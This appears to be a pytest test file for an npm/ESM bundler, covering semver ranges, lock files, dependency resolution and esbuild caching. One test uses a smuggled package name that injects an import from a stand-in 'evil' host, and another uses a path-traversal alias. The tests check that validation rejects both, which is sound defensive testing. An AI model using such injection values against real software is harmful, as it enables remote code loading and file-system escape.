    def _tarball_for(self, name, version, deps=None, license_id='MIT',
                      license_text='MIT license text'):
        pkg_json = {'name': name, 'version': version, 'license': license_id}
        if deps:
            pkg_json['dependencies'] = deps
        files = {'package.json': json.dumps(pkg_json), 'index.js': 'export default 1;\n'}
        if license_text:
            files['LICENSE'] = license_text
        path = os.path.join(self.work, f'{_safe_pkg_name(name)}-{version}.tgz')
        return _make_tarball(path, files)

    def test_bundle_downloads_transitive_deps_and_writes_outputs(self):
        base_tgz = self._tarball_for('base-lib', '1.0.0', license_text='Base license text')
        top_tgz = self._tarball_for('weird-name', '2.0.0', deps={'base-lib': '1.0.0'})
        dists = {'weird-name': _dist_for(top_tgz), 'base-lib': _dist_for(base_tgz)}
        versions = {'weird-name': '2.0.0', 'base-lib': '1.0.0'}
        calls = []

        def fetch(url):
            calls.append(url)
            for pkg_name, dist in dists.items():
                if pkg_name in url:
                    return {'version': versions[pkg_name], 'dist': dist}
            raise AssertionError(f'unexpected fetch: {url}')

        self.builder._fetch_json = fetch

        items = [('weird', 'weird-name@2.0.0')]
        results = self.builder.bundle(items, self.output_dir)

        assert len(results) == 1
        alias, name, version, out_file = results[0]
        assert (alias, name, version) == ('weird', 'weird-name', '2.0.0')
        assert os.path.isfile(out_file)
        with open(out_file) as f:
            content = f.read()
        assert content.strip() == 'export * from "weird-name";'

        assert os.path.isfile(os.path.join(self.output_dir, 'gnr_ext_bundle.js'))

        with open(os.path.join(self.output_dir, 'dependencies.json')) as f:
            deps = json.load(f)
        assert deps == {'weird-name': '2.0.0', 'base-lib': '1.0.0'}

        with open(os.path.join(self.output_dir, 'THIRD-PARTY-LICENSES.txt')) as f:
            attribution = f.read()
        assert 'weird-name@2.0.0' in attribution
        assert 'base-lib@1.0.0' in attribution
        assert 'Base license text' in attribution

        # Second call is served entirely from the manifest cache: no further downloads.
        calls.clear()
        results2 = self.builder.bundle(items, self.output_dir)
        assert results2 == results
        assert calls == []

    def test_malicious_package_name_is_rejected_before_any_network_call(self):
        """A spec whose 'name' component would break out of a path or a JS
        string (quotes, slashes, parens, ...) must never reach the
        filesystem or an entry file: _parse_spec's validation rejects it
        immediately, before download_package or _symlink_package ever run."""
        malicious_name = "innocuous'; import('http://evil/x.js'); //"
        calls = []
        self.builder._fetch_json = lambda url: calls.append(url)

        items = [('safe', f'{malicious_name}@1.0.0')]
        with pytest.raises(ValueError, match='Invalid npm package name'):
            self.builder.bundle(items, self.output_dir)

        assert calls == []

    def test_valid_package_name_is_json_escaped_in_entry_file(self):
        """Even a name that passes validation is written through json.dumps,
        not naive single-quoting, as defense in depth."""
        tgz = self._tarball_for('my.pkg-name_2', '1.0.0')
        dist = _dist_for(tgz)
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        items = [('safe', 'my.pkg-name_2@1.0.0')]
        results = self.builder.bundle(items, self.output_dir)

        out_file = results[0][3]
        with open(out_file) as f:
            content = f.read()
        assert content.strip() == f'export * from {json.dumps("my.pkg-name_2")};'

    def test_bundle_rejects_path_traversal_alias_before_any_network_call(self):
        calls = []
        self.builder._fetch_json = lambda url: calls.append(url)

        with pytest.raises(ValueError, match='Invalid alias'):
            self.builder.bundle([('../../etc/evil', 'react@18.0.0')], self.output_dir)

        assert calls == []


class TestInstanceBundlerLocking(BaseGnrAppTest):
    def setup_method(self):
        self.work = tempfile.mkdtemp()
        self.output_dir = tempfile.mkdtemp()

    def _make_package(self, pkgid, requirements_text):
        parent = os.path.join(self.work, f'parent_{pkgid}')
        pkg_dir = os.path.join(parent, pkgid)
        os.makedirs(pkg_dir)
        with open(os.path.join(pkg_dir, 'esm_requirements.txt'), 'w') as f:
            f.write(requirements_text)
        return parent, pkg_dir

    def test_lock_written_after_first_build_and_reused_on_second(self):
        parent, pkg_dir = self._make_package('pkgone', 'myreact=react@^18.0.0\n')

        react_tgz = os.path.join(self.work, 'react-18.2.0.tgz')
        _make_tarball(react_tgz, {'package.json': json.dumps({'name': 'react', 'version': '18.2.0'})})
        dist = _dist_for(react_tgz)
        calls = []

        def fetch(url):
            calls.append(url)
            if url.endswith('/react'):
                return {'versions': {'18.2.0': {}}, 'dist-tags': {}}
            return {'version': '18.2.0', 'dist': dist}

        app = _FakeApp({'pkgone': parent})
        bundler = GnrInstanceEsmBundler(app)
        bundler.builder._fetch_json = fetch
        bundler.builder.get_esbuild = lambda: _write_fake_esbuild(
            os.path.join(self.work, 'fake-esbuild')
        )

        output_dir, results = bundler.run(output=self.output_dir)
        assert output_dir == self.output_dir
        assert len(results) == 1

        lock_path = os.path.join(pkg_dir, 'esm_requirements.lock')
        assert os.path.isfile(lock_path)
        with open(lock_path) as f:
            lock = json.load(f)
        assert lock['aliases']['myreact'] == {
            'spec': 'react@^18.0.0', 'name': 'react', 'version': '18.2.0',
        }
        assert lock['dependencies'] == {'react': '18.2.0'}

        # Second build (forced, to bypass the manifest cache): the lock pins
        # the exact version, so no range re-resolution should be requested.
        calls.clear()
        _output_dir2, results2 = bundler.run(force=True, output=self.output_dir)
        assert (results2[0][1], results2[0][2]) == ('react', '18.2.0')
        assert calls  # the exact-version endpoint was still hit once
        assert not any(c.endswith('/react') for c in calls)

    def test_conflicting_alias_across_packages_raises(self):
        parent1, _ = self._make_package('pkgone', 'shared=react@18.2.0\n')
        parent2, _ = self._make_package('pkgtwo', 'shared=react@17.0.0\n')
        app = _FakeApp({'pkgone': parent1, 'pkgtwo': parent2})
        bundler = GnrInstanceEsmBundler(app)

        with pytest.raises(RuntimeError, match='Conflicting esm_requirements'):
            bundler.collect_requirements()

    def test_no_requirements_returns_none(self):
        app = _FakeApp({})
        bundler = GnrInstanceEsmBundler(app)
        assert bundler.run(output=self.output_dir) == (None, None)


class TestRangePredicate(BaseGnrAppTest):
    """node-semver range forms common in real package.json files."""

    @pytest.mark.parametrize('spec, matching, not_matching', [
        ('^16.8.0 || ^17.0.0 || ^18.0.0', ['16.8.0', '17.0.2', '18.3.1'], ['16.7.0', '19.0.0']),
        ('*', ['0.0.1', '99.0.0'], []),
        ('', ['0.0.1', '99.0.0'], []),
        ('x', ['1.2.3'], []),
        ('1.x', ['1.0.0', '1.9.9'], ['0.9.0', '2.0.0']),
        ('1.2.x', ['1.2.0', '1.2.9'], ['1.3.0']),
        ('>=17.x', ['17.0.0', '19.1.0'], ['16.9.9']),
        ('>=1.0.0 <2.0.0', ['1.0.0', '1.9.9'], ['0.9.9', '2.0.0']),
        ('1.0.0 - 1.5.0', ['1.0.0', '1.5.0'], ['0.9.9', '1.5.1']),
        ('1.0 - 1.5', ['1.0.0', '1.5.9'], ['1.6.0']),
        ('>= 1.2.3', ['1.2.3', '2.0.0'], ['1.2.2']),
        ('~1', ['1.0.0', '1.9.0'], ['2.0.0']),
        ('~> 1.2.3', ['1.2.3', '1.2.9'], ['1.3.0']),
        ('^0.2.3', ['0.2.3', '0.2.9'], ['0.3.0']),
        ('^0.0.3', ['0.0.3'], ['0.0.4']),
        ('^0.x', ['0.0.1', '0.9.0'], ['1.0.0']),
        ('>1', ['2.0.0'], ['1.9.9']),
        ('<=1.2', ['1.2.9'], ['1.3.0']),
        ('=1.2.3', ['1.2.3'], ['1.2.4']),
        ('v1.2.3', ['1.2.3'], ['1.2.4']),
    ])
    def test_range_forms(self, spec, matching, not_matching):
        predicate = _range_predicate(spec)
        for version in matching:
            assert predicate(_semver_tuple(version)), f'{version} should satisfy {spec!r}'
        for version in not_matching:
            assert not predicate(_semver_tuple(version)), f'{version} should not satisfy {spec!r}'

    @pytest.mark.parametrize('spec', ['latest', 'foo bar', '1.2.3.4', '^^1', '>=a.b'])
    def test_garbage_raises(self, spec):
        with pytest.raises(ValueError):
            _range_predicate(spec)

    def test_satisfies_exact_and_tags(self):
        assert _satisfies('1.2.3', '1.2.3')
        assert not _satisfies('1.2.4', '1.2.3')
        assert _satisfies('1.2.3', 'latest')
        assert _satisfies('1.2.3', '^1.0.0 || ^2.0.0')
        assert not _satisfies('3.0.0', '^1.0.0 || ^2.0.0')
        assert not _satisfies('1.2.3', 'not a range')


class TestResolveVersionRanges(BaseGnrAppTest):
    """_resolve_version against a stubbed registry, for the range forms that
    used to abort the whole build as 'Unparseable version spec'."""

    VERSIONS = ['0.9.0', '1.0.0', '1.4.0', '1.5.0', '1.6.0', '16.8.0', '17.0.2',
                '18.3.1', '19.0.0', '2.0.0-rc.1']

    def setup_method(self):
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        meta = {'versions': {v: {} for v in self.VERSIONS}, 'dist-tags': {'latest': '19.0.0'}}
        self.builder._fetch_json = lambda url: meta

    @pytest.mark.parametrize('spec, expected', [
        ('^16.8.0 || ^17.0.0 || ^18.0.0', '18.3.1'),
        ('*', '19.0.0'),
        ('1.x', '1.6.0'),
        ('>=17.x', '19.0.0'),
        ('>=1.0.0 <2.0.0', '1.6.0'),
        ('1.0.0 - 1.5.0', '1.5.0'),
    ])
    def test_resolves(self, spec, expected):
        assert self.builder._needs_resolution(spec)
        assert self.builder._resolve_version('lib', spec) == expected

    def test_unparseable_raises_before_any_network_call(self):
        calls = []
        self.builder._fetch_json = lambda url: calls.append(url)
        with pytest.raises(RuntimeError, match='Unparseable version spec'):
            self.builder._resolve_version('lib', '1.2.3.4')
        assert calls == []

    def test_unknown_dist_tag_raises(self):
        with pytest.raises(RuntimeError, match='Unknown dist-tag'):
            self.builder._resolve_version('lib', 'nightly')


class TestDependencySources(BaseGnrAppTest):
    """npm: aliases, non-registry sources and lock pins, through bundle()."""

    def setup_method(self):
        self.work = tempfile.mkdtemp()
        self.output_dir = tempfile.mkdtemp()
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        self.builder.get_esbuild = lambda: _write_fake_esbuild(
            os.path.join(self.work, 'fake-esbuild')
        )
        self.registry = _FakeRegistry(self.work)
        self.builder._fetch_json = self.registry

    def _deps(self):
        with open(os.path.join(self.output_dir, 'dependencies.json')) as f:
            return json.load(f)

    def test_npm_alias_is_fetched_under_its_real_name(self):
        self.registry.publish('string-width', '4.2.3')
        self.registry.publish('top', '1.0.0', deps={'string-width-cjs': 'npm:string-width@^4.2.0'})

        self.builder.bundle([('top', 'top@1.0.0')], self.output_dir)

        assert self._deps() == {'top': '1.0.0', 'string-width-cjs': '4.2.3'}
        assert self.registry.packument_calls('string-width')

    def test_peer_dependency_with_or_range_is_followed(self):
        self.registry.publish('react', '17.0.2')
        self.registry.publish('react', '18.3.1')
        self.registry.publish('widget', '1.0.0', peer_deps={'react': '^16.8.0 || ^17.0.0 || ^18.0.0'})

        self.builder.bundle([('widget', 'widget@1.0.0')], self.output_dir)

        assert self._deps()['react'] == '18.3.1'

    def test_git_dependency_fails_the_build(self):
        self.registry.publish('top', '1.0.0', deps={'thing': 'github:user/thing'})
        with pytest.raises(RuntimeError, match='Unsupported dependency source'):
            self.builder.bundle([('top', 'top@1.0.0')], self.output_dir)

    def test_pinned_transitive_version_is_used_without_resolving(self):
        self.registry.publish('base-lib', '1.0.0')
        self.registry.publish('base-lib', '1.1.0')
        self.registry.publish('top', '1.0.0', deps={'base-lib': '^1.0.0'})

        self.builder.bundle([('top', 'top@1.0.0')], self.output_dir,
                            pinned={'base-lib': '1.0.0'})

        assert self._deps()['base-lib'] == '1.0.0'
        assert self.registry.packument_calls('base-lib') == []

    def test_unpinned_transitive_version_resolves_to_latest_match(self):
        self.registry.publish('base-lib', '1.0.0')
        self.registry.publish('base-lib', '1.1.0')
        self.registry.publish('top', '1.0.0', deps={'base-lib': '^1.0.0'})

        self.builder.bundle([('top', 'top@1.0.0')], self.output_dir)

        assert self._deps()['base-lib'] == '1.1.0'

    def test_pin_outside_the_requested_range_is_ignored(self):
        self.registry.publish('base-lib', '1.1.0')
        self.registry.publish('base-lib', '2.0.0')
        self.registry.publish('top', '1.0.0', deps={'base-lib': '^1.0.0'})

        self.builder.bundle([('top', 'top@1.0.0')], self.output_dir,
                            pinned={'base-lib': '2.0.0'})

        assert self._deps()['base-lib'] == '1.1.0'


class TestEsbuildCacheKey(BaseGnrAppTest):
    def test_binary_without_version_in_its_name_is_not_reused(self, monkeypatch):
        """A binary cached by an older, unpinned download ('esbuild') must not
        be picked up in place of the pinned version."""
        monkeypatch.setattr(platform, 'system', lambda: 'Linux')
        monkeypatch.setattr(platform, 'machine', lambda: 'x86_64')
        work = tempfile.mkdtemp()
        builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        _write_fake_esbuild(os.path.join(builder.cache_dir, 'esbuild'))

        tgz = os.path.join(work, 'esbuild.tgz')
        _make_tarball(tgz, {'bin/esbuild': '#!/bin/sh\necho pinned\n'})
        dist = _dist_for(tgz)
        builder._fetch_json = lambda url: {'dist': dist}

        path = builder.get_esbuild()

        assert os.path.basename(path) == f'esbuild-{_ESBUILD_VERSION}'
        with open(path) as f:
            assert 'pinned' in f.read()


class TestInstanceLockPinsTransitiveTree(BaseGnrAppTest):
    def setup_method(self):
        self.work = tempfile.mkdtemp()
        self.output_dir = tempfile.mkdtemp()
        self.registry = _FakeRegistry(self.work)

    def _bundler(self, package_dirs):
        bundler = GnrInstanceEsmBundler(_FakeApp(package_dirs))
        bundler.builder._fetch_json = self.registry
        bundler.builder.get_esbuild = lambda: _write_fake_esbuild(
            os.path.join(self.work, 'fake-esbuild')
        )
        return bundler

    def _make_package(self, pkgid, requirements_text):
        parent = os.path.join(self.work, f'parent_{pkgid}')
        pkg_dir = os.path.join(parent, pkgid)
        os.makedirs(pkg_dir)
        with open(os.path.join(pkg_dir, 'esm_requirements.txt'), 'w') as f:
            f.write(requirements_text)
        return parent, pkg_dir

    def test_rebuild_reuses_locked_transitive_versions(self):
        """A newer transitive release published after the lock was written must
        not reach a rebuild: the lock pins the whole tree, not just aliases."""
        parent, pkg_dir = self._make_package('pkgone', 'top=top@^1.0.0\n')
        self.registry.publish('base-lib', '1.0.0')
        self.registry.publish('top', '1.0.0', deps={'base-lib': '^1.0.0'})

        self._bundler({'pkgone': parent}).run(output=self.output_dir)
        with open(os.path.join(pkg_dir, 'esm_requirements.lock')) as f:
            assert json.load(f)['dependencies'] == {'base-lib': '1.0.0', 'top': '1.0.0'}

        self.registry.publish('base-lib', '1.2.0')
        self.registry.calls.clear()
        self._bundler({'pkgone': parent}).run(force=True, output=self.output_dir)

        with open(os.path.join(self.output_dir, 'dependencies.json')) as f:
            assert json.load(f)['base-lib'] == '1.0.0'
        assert self.registry.packument_calls('base-lib') == []

    def test_stale_lock_does_not_pin(self):
        """Once the declared spec changes, the old lock's tree is not applied."""
        parent, pkg_dir = self._make_package('pkgone', 'top=top@^1.0.0\n')
        self.registry.publish('base-lib', '1.0.0')
        self.registry.publish('top', '1.0.0', deps={'base-lib': '^1.0.0'})
        self._bundler({'pkgone': parent}).run(output=self.output_dir)

        self.registry.publish('base-lib', '1.2.0')
        with open(os.path.join(pkg_dir, 'esm_requirements.txt'), 'w') as f:
            f.write('top=top@1.0.0\n')
        self._bundler({'pkgone': parent}).run(output=self.output_dir)

        with open(os.path.join(self.output_dir, 'dependencies.json')) as f:
            assert json.load(f)['base-lib'] == '1.2.0'


CONFIG = """<?xml version="1.0" ?>
<GenRoBag>
  <db filename="test.db" implementation="sqlite"/>
  <packages>
%s
  </packages>
</GenRoBag>"""

REQUIRING_MAIN = """from gnr.app.gnrdbo import GnrDboPackage

class Package(GnrDboPackage):
    def required_packages(self):
        return ['esmproj:esmreq']
"""

LEAF_MAIN = """from gnr.app.gnrdbo import GnrDboPackage

class Package(GnrDboPackage):
    def required_packages(self):
        return []
"""


class TestInstanceClosureCollection(BaseGnrTest):
    """ESM requirements are collected from the same package closure the python
    dependency check walks, on a real GnrApp in checkdep mode."""

    @classmethod
    def setup_class(cls):
        super().setup_class()
        # a package reached only through required_packages(), living in a
        # project under a projects root declared in environment.xml
        cls.required_folder = os.path.join(cls.tmp_conf_dir, 'esmproj', 'packages', 'esmreq')
        cls._write_package(cls.required_folder, LEAF_MAIN, 'reqlib=req-lib@1.0.0\n')
        # a package whose folder name differs from its id (filename attribute)
        cls.packages_root = tempfile.mkdtemp(prefix='gnrtest_esm_')
        cls._write_package(os.path.join(cls.packages_root, 'esmfile_src'), REQUIRING_MAIN,
                           'filelib=file-lib@2.0.0\n')

    @classmethod
    def teardown_class(cls):
        super().teardown_class()
        shutil.rmtree(cls.packages_root, ignore_errors=True)

    @classmethod
    def _write_package(cls, folder, main_source, esm_requirements):
        os.makedirs(folder)
        with open(os.path.join(folder, 'main.py'), 'w', encoding='utf-8') as fp:
            fp.write(main_source)
        with open(os.path.join(folder, 'esm_requirements.txt'), 'w', encoding='utf-8') as fp:
            fp.write(esm_requirements)

    @pytest.fixture(autouse=True)
    def _isolated_home(self, monkeypatch):
        # the instance bundler keeps its download cache under ~/.gnr
        monkeypatch.setenv('HOME', tempfile.mkdtemp())

    def _app(self, **kwargs):
        declared = '    <esmfile pkgcode="esmfile" path="%s" filename="esmfile_src"/>' % self.packages_root
        with open(self.test_instance_config_path, 'w', encoding='utf-8') as fp:
            fp.write(CONFIG % declared)
        return GnrApp(self.test_instance_name, checkdepcli=True, **kwargs)

    def test_collects_required_and_filename_packages(self):
        bundler = GnrInstanceEsmBundler(self._app())
        items = bundler.collect_requirements()
        assert items['filelib']['packages'] == ['esmfile']
        assert items['reqlib']['packages'] == ['esmreq']

    def test_up_to_date_check_is_network_free(self, monkeypatch):
        monkeypatch.setattr(esmbuilder, 'NPM_REGISTRY', 'file:///nonexistent-registry')
        bundler = GnrInstanceEsmBundler(self._app())
        assert bundler.is_up_to_date(output=tempfile.mkdtemp()) is False

    def test_startup_check_logs_missing_bundles(self, caplog):
        app = self._app()
        with caplog.at_level(logging.WARNING, logger='gnr.app'):
            app.check_esm_bundles()
        assert 'ESM bundles are missing' in caplog.text

    def test_build_failure_raises(self, monkeypatch):
        """build_esm_bundles is what checkdep turns into a non-zero exit code:
        a failure must propagate, not be logged and swallowed."""
        monkeypatch.setattr(esmbuilder, 'NPM_REGISTRY', 'file:///nonexistent-registry')
        app = self._app()
        with pytest.raises(OSError):
            app.build_esm_bundles(output=tempfile.mkdtemp())
